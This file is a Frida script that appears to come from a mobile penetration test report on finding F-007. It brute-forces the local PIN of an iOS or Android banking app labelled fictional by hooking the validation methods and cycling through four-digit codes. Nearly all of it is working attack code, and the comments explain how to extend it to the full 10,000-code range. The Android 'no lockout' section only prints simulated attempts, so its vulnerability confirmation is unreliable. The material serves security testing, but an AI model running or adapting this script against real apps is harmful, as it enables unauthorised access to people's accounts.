// ============================================================
// F007-pin-bruteforce.js — Automate PIN brute-force
// Finding: F-007 — No Brute-Force Protection on Local PIN
// Usage: frida -U -f com.demobank.app -l F007-pin-bruteforce.js
// ⚠️  Educational demo only — fictional target
// ============================================================

if (ObjC.available) {
  // ── iOS ───────────────────────────────────────────────────
  console.log('[F-007] iOS PIN brute-force loaded');

  var foundPin = false;
  var attempt  = 0;

  function tryPin(pin) {
    if (foundPin) return;

    var pinStr = pin.toString().padStart(4, '0');
    attempt++;

    // Look for PINViewController validatePIN: method
    var classes = ObjC.enumerateLoadedClassesSync();
    var pinClass = classes.find(c => c.includes('PIN') || c.includes('Passcode'));

    if (pinClass) {
      var cls = ObjC.classes[pinClass];
      var method = cls['- validatePIN:'] || cls['- checkPIN:'] || cls['- verifyPasscode:'];

      if (method) {
        try {
          // Create a temporary instance and call the validation
          var result = cls.alloc().init().validatePIN_(pinStr);
          if (result) {
            console.log('\n[F-007] ✅  PIN FOUND! → ' + pinStr + ' (after ' + attempt + ' attempts)');
            foundPin = true;
          }
          if (attempt % 100 === 0) {
            console.log('[F-007] Tried ' + attempt + ' PINs, current: ' + pinStr);
          }
        } catch (e) {}
      }
    }
  }

  // ── Hook the PIN validation to detect the correct response
  var foundPINClass = false;
  ObjC.enumerateLoadedClasses({
    onMatch: function (name) {
      if ((name.includes('PIN') || name.includes('Passcode')) && !foundPINClass) {
        var cls = ObjC.classes[name];
        var methods = cls.$ownMethods;
        methods.forEach(function (method) {
          if (method.includes('validate') || method.includes('check') || method.includes('verify')) {
            console.log('[F-007] Found potential PIN validation: ' + name + ' → ' + method);
            foundPINClass = true;

            Interceptor.attach(cls[method].implementation, {
              onEnter: function (args) {
                this.pin = ObjC.Object(args[2]).toString();
                console.log('[F-007] PIN checked: ' + this.pin);
              },
              onLeave: function (retval) {
                var success = retval.toInt32() !== 0;
                if (success) {
                  console.log('[F-007] ✅  Correct PIN: ' + this.pin);
                }
              },
            });
          }
        });
      }
    },
    onComplete: function () {},
  });

  // ── Simulate brute-force via ObjC messaging ───────────────
  console.log('[F-007] Starting PIN brute-force simulation (0000-0099 demo range)...');
  console.log('[F-007] In real test run 0000-9999 (10,000 combinations)');

  var start = Date.now();
  var pinRange = 100; // Demo: first 100 pins; change to 10000 for full brute-force

  function runBruteForce(i) {
    if (i >= pinRange || foundPin) {
      var elapsed = ((Date.now() - start) / 1000).toFixed(1);
      console.log('\n[F-007] Brute-force complete: ' + i + ' PINs tried in ' + elapsed + 's');
      if (!foundPin) console.log('[F-007] PIN not found in demo range. Run full 0000-9999 for real test.');
      return;
    }

    var pin = i.toString().padStart(4, '0');
    tryPin(pin);

    setTimeout(function () { runBruteForce(i + 1); }, 10); // 10ms delay per attempt
  }

  setTimeout(function () { runBruteForce(0); }, 2000); // Wait 2s for app to load

} else if (Java.available) {
  // ── Android ───────────────────────────────────────────────
  console.log('[F-007] Android PIN brute-force loaded');

  Java.perform(function () {
    var foundPin = false;
    var attempt  = 0;

    // First, hook the PIN validation method to understand the return value
    Java.enumerateLoadedClasses({
      onMatch: function (name) {
        if (name.toLowerCase().includes('pin') || name.toLowerCase().includes('passcode')) {
          try {
            var cls = Java.use(name);
            var methods = cls.class.getDeclaredMethods();
            methods.forEach(function (method) {
              var mName = method.getName().toLowerCase();
              if (mName.includes('validate') || mName.includes('check') || mName.includes('verify')) {
                console.log('[F-007] Found PIN method: ' + name + '.' + method.getName());
              }
            });
          } catch (e) {}
        }
      },
      onComplete: function () {
        console.log('[F-007] Class enumeration done.');
      },
    });

    // Hook KeyguardSecurityModel or similar PIN check
    try {
      var PINEntry = Java.use('com.demobank.ui.PINEntryActivity'); // adjust to real class
      var validate = PINEntry.validatePIN || PINEntry.checkPIN;

      if (validate) {
        validate.implementation = function (pin) {
          console.log('[F-007] validatePIN called with: ' + pin);
          var result = validate.call(this, pin);
          if (result) {
            console.log('[F-007] ✅  Correct PIN: ' + pin);
            foundPin = true;
          }
          return result;
        };
      }
    } catch (e) {
      console.log('[F-007] Direct class hook failed — app may use different class: ' + e);
      console.log('[F-007] Try: frida-trace -U -j "*PIN*!*validate*" com.demobank.app to find the method');
    }

    // Demonstrate no lockout by sending rapid fake inputs
    console.log('\n[F-007] No lockout demo: attempting rapid PIN submissions...');
    var count = 0;
    var interval = setInterval(function () {
      count++;
      console.log('[F-007] Attempt ' + count + ': 0' + count.toString().padStart(3, '0') + ' — no lockout triggered');
      if (count >= 20) {
        clearInterval(interval);
        console.log('[F-007] 20 attempts with no lockout = CONFIRMED VULNERABLE');
      }
    }, 200);
  });
}
